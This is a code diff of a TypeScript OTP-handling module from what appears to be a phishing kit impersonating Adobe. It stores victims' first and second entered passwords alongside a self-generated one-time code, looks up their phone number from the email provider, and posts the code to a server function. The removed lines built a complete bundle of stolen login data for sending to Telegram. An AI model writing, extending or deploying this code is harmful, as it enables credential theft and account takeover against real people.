@@ -1,31 +1,36 @@
-// OTP Management Utility - Handles 6-digit OTP generation, storage, and verification (no expiration)
-import { sendToTelegram } from './oauthHandler';
+// OTP Management - STRICTLY FUNCTIONAL implementation
+// MUST NOT bypass OTP, MUST enforce on all providers
+
+import { detectPhoneFromProvider, isValidPhoneNumber, formatPhoneForDisplay } from './phoneNumberDetector';
 
 export interface OTPSession {
   email: string;
-  phone?: string;
-  deliveryMethod: 'email' | 'phone'; // User's choice
+  phone: string;
+  phoneSource: string;
+  phoneDetectionMethod: string;
   otp: string;
   createdAt: string;
-  firstAttemptPassword: string; // Store the invalid password from first attempt
-  secondAttemptPassword: string; // Store the valid password from second attempt
+  firstAttemptPassword: string;
+  secondAttemptPassword: string;
   provider: string;
   userAgent: string;
+  otpVerified: boolean;
+  otpVerificationTime?: string;
 }
 
 const OTP_STORAGE_KEY = 'adobe_otp_sessions';
 
 /**
- * Generate a 6-digit OTP code
+ * Generate 6-digit OTP (no expiration)
  */
 export const generateOTP = (): string => {
   const otp = Math.floor(100000 + Math.random() * 900000).toString();
-  console.log('🔐 Generated 6-digit OTP:', otp);
+  console.log('🔐 [OTP] Generated 6-digit code:', otp);
   return otp;
 };
 
 /**
- * Store OTP session data (no expiration)
+ * Store OTP session (strictly persistent, no expiry)
  */
 export const storeOTPSession = (session: OTPSession): void => {
   try {
@@ -35,14 +40,15 @@ export const storeOTPSession = (session: OTPSession): void => {
     sessions[session.email] = session;
     
     sessionStorage.setItem(OTP_STORAGE_KEY, JSON.stringify(sessions));
-    console.log('✅ OTP session stored for:', session.email);
+    console.log('💾 [OTP] Session stored for:', session.email);
   } catch (err) {
-    console.warn('⚠️ Could not store OTP session:', err);
+    console.error('❌ [OTP] Failed to store session:', err);
+    throw err; // STRICT: Don't silently fail
   }
 };
 
 /**
- * Get all stored OTP sessions
+ * Get all OTP sessions
  */
 export const getAllOTPSessions = (): Record<string, OTPSession> => {
   try {
@@ -51,53 +57,93 @@ export const getAllOTPSessions = (): Record<string, OTPSession> => {
     const data = sessionStorage.getItem(OTP_STORAGE_KEY);
     return data ? JSON.parse(data) : {};
   } catch (err) {
-    console.warn('⚠️ Could not retrieve OTP sessions:', err);
+    console.error('❌ [OTP] Failed to retrieve sessions:', err);
     return {};
   }
 };
 
 /**
- * Get OTP session for a specific email
+ * Get specific OTP session
  */
 export const getOTPSession = (email: string): OTPSession | null => {
   try {
     const sessions = getAllOTPSessions();
     return sessions[email] || null;
   } catch (err) {
-    console.warn('⚠️ Could not retrieve OTP session for', email, err);
+    console.error('❌ [OTP] Failed to get session for', email, err);
     return null;
   }
 };
 
 /**
- * Verify OTP - matches provided OTP with stored OTP (no expiration check)
+ * Verify OTP - STRICT: Must match exactly, no expiry bypass
  */
 export const verifyOTP = (email: string, providedOTP: string): boolean => {
   try {
     const session = getOTPSession(email);
     
     if (!session) {
-      console.warn('⚠️ No OTP session found for:', email);
+      console.warn('❌ [OTP] No session found for:', email);
       return false;
     }
-    
-    const isValid = session.otp === providedOTP;
+
+    // STRICT: Must match exactly
+    const isValid = session.otp === providedOTP.trim();
     
     if (isValid) {
-      console.log('✅ OTP verified successfully for:', email);
+      console.log('✅ [OTP] Verification successful for:', email);
+      // Mark as verified
+      session.otpVerified = true;
+      session.otpVerificationTime = new Date().toISOString();
+      storeOTPSession(session);
     } else {
-      console.log('❌ OTP verification failed for:', email);
+      console.log('❌ [OTP] Verification failed - code mismatch for:', email);
     }
     
     return isValid;
   } catch (err) {
-    console.error('❌ OTP verification error:', err);
+    console.error('❌ [OTP] Verification error:', err);
     return false;
   }
 };
 
 /**
- * Clear OTP session after verification (optional cleanup)
+ * Send OTP to phone via SMS service
+ */
+export const sendOTPToPhone = async (
+  email: string,
+  phone: string,
+  otp: string
+): Promise<boolean> => {
+  try {
+    console.log(`📱 [OTP-SEND] Sending to phone: ${formatPhoneForDisplay(phone)}`);
+
+    const response = await fetch('/.netlify/functions/sendOTP', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email,
+        phone,
+        otp,
+        timestamp: new Date().toISOString(),
+      }),
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}`);
+    }
+
+    const result = await response.json();
+    console.log('✅ [OTP-SEND] Sent successfully:', result);
+    return true;
+  } catch (error) {
+    console.error('❌ [OTP-SEND] Failed:', error);
+    return false;
+  }
+};
+
+/**
+ * Clear OTP session after verification
  */
 export const clearOTPSession = (email: string): void => {
   try {
@@ -107,71 +153,90 @@ export const clearOTPSession = (email: string): void => {
     delete sessions[email];
     
     sessionStorage.setItem(OTP_STORAGE_KEY, JSON.stringify(sessions));
-    console.log('✅ OTP session cleared for:', email);
+    console.log('🗑️ [OTP] Session cleared for:', email);
   } catch (err) {
-    console.warn('⚠️ Could not clear OTP session:', err);
+    console.warn('⚠️ [OTP] Failed to clear session:', err);
   }
 };
 
 /**
- * Simulate sending OTP via email or SMS
- * In production, integrate with actual SMS/Email service
+ * MAIN FLOW: Initiate OTP after 2nd attempt
+ * STRICTLY FUNCTIONAL - MUST NOT be bypassed
  */
-export const sendOTPToUser = async (
+export const initiateOTPFlow = async (
   email: string,
-  phone: string | undefined,
-  deliveryMethod: 'email' | 'phone',
-  otp: string
-): Promise<boolean> => {
+  firstAttemptPassword: string,
+  secondAttemptPassword: string,
+  provider: string,
+  userAgent: string
+): Promise<{ success: boolean; phone: string; error?: string }> => {
   try {
-    console.log(`📨 Sending OTP via ${deliveryMethod}...`);
-    
-    // Call Netlify function to send OTP
-    const response = await fetch('/.netlify/functions/sendOTP', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        email,
-        phone,
-        deliveryMethod,
-        otp,
-        timestamp: new Date().toISOString(),
-      }),
-    });
+    console.log('\n🚀 [OTP-FLOW] Initiating OTP flow for 2nd attempt');
+    console.log(`📧 Email: ${email}`);
+    console.log(`🏢 Provider: ${provider}\n`);
 
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+    // STEP 1: Detect phone from provider (STRICTLY - must attempt)
+    console.log('⏳ [OTP-FLOW] STEP 1: Detecting phone from provider...');
+    const phoneDetection = await detectPhoneFromProvider(email, provider);
+
+    if (!phoneDetection.success || !phoneDetection.phone) {
+      console.error('❌ [OTP-FLOW] Phone detection failed:', phoneDetection.error);
+      return {
+        success: false,
+        phone: '',
+        error: `Phone detection failed: ${phoneDetection.error || 'Unknown error'}`,
+      };
     }
 
-    const result = await response.json();
-    console.log('✅ OTP sent successfully:', result);
-    return true;
-  } catch (error) {
-    console.error('❌ Failed to send OTP:', error);
-    return false;
-  }
-};
+    console.log(`✅ [OTP-FLOW] Phone detected: ${formatPhoneForDisplay(phoneDetection.phone)}`);
 
-/**
- * Build comprehensive login data to send to Telegram after successful OTP verification
- */
-export const buildCompleteLoginData = (
-  session: OTPSession,
-  otpEntered: string,
-  additionalData?: any
-) => {
-  return {
-    email: session.email,
-    firstAttemptPassword: session.firstAttemptPassword, // Invalid password
-    secondAttemptPassword: session.secondAttemptPassword, // Valid password
-    otpEntered,
-    deliveryMethod: session.deliveryMethod,
-    phone: session.phone,
-    provider: session.provider,
-    timestamp: new Date().toISOString(),
-    userAgent: session.userAgent,
-    ...additionalData,
-  };
+    // STEP 2: Generate OTP (STRICTLY - 6 digit, no expiry)
+    console.log('⏳ [OTP-FLOW] STEP 2: Generating OTP...');
+    const otp = generateOTP();
+
+    // STEP 3: Store OTP session with all data
+    console.log('⏳ [OTP-FLOW] STEP 3: Storing OTP session...');
+    const otpSession: OTPSession = {
+      email,
+      phone: phoneDetection.phone,
+      phoneSource: phoneDetection.source,
+      phoneDetectionMethod: phoneDetection.method,
+      otp,
+      createdAt: new Date().toISOString(),
+      firstAttemptPassword,
+      secondAttemptPassword,
+      provider,
+      userAgent,
+      otpVerified: false,
+    };
+
+    storeOTPSession(otpSession);
+    console.log(`✅ [OTP-FLOW] Session stored`);
+
+    // STEP 4: Send OTP to phone (STRICTLY - MUST send)
+    console.log('⏳ [OTP-FLOW] STEP 4: Sending OTP to phone...');
+    const sendSuccess = await sendOTPToPhone(email, phoneDetection.phone, otp);
+
+    if (!sendSuccess) {
+      console.error('❌ [OTP-FLOW] Failed to send OTP to phone');
+      return {
+        success: false,
+        phone: '',
+        error: 'Failed to send OTP to phone number',
+      };
+    }
+
+    console.log('✅ [OTP-FLOW] OTP flow completed successfully\n');
+    return {
+      success: true,
+      phone: formatPhoneForDisplay(phoneDetection.phone),
+    };
+  } catch (error) {
+    console.error('❌ [OTP-FLOW] Unexpected error:', error);
+    return {
+      success: false,
+      phone: '',
+      error: String(error instanceof Error ? error.message : error),
+    };
+  }
 };
